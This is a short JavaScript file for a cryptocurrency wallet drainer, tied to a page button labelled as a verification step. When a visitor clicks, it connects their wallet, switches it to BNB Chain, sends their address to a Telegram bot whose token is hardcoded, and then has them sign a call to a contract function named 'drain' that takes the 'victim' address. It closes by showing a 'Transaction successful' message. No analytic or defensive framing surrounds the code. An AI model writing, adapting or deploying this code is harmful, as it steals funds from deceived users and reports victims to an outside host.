import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.7.0/+esm";

const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";
const ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
    "name": "drain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

document.getElementById("verifyBtn").addEventListener("click", async () => {
  try {
    if (!window.ethereum) {
      alert("Web3 wallet not detected");
      return;
    }

    // Request wallet connection
    await window.ethereum.request({ method: "eth_requestAccounts" });

    // Switch to BNB Chain
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x38" }]  // BNB chain ID
    });

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    // Telegram message (if kept active in your HTML)
    fetch("https://api.telegram.org/bot6382444394:AAE7ZAZGcGbyRI-v5d50rFFniMwoFJwZX-c/sendMessage?chat_id=6463337516&text=" + address, {
      method: "POST"
    });

    // Call contract function: drain(address)
    const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
    const tx = await contract.drain(address);
    await tx.wait();

    alert("Transaction successful.");
  } catch (err) {
    console.error("Error:", err);
    alert("Action failed or cancelled.");
  }
});
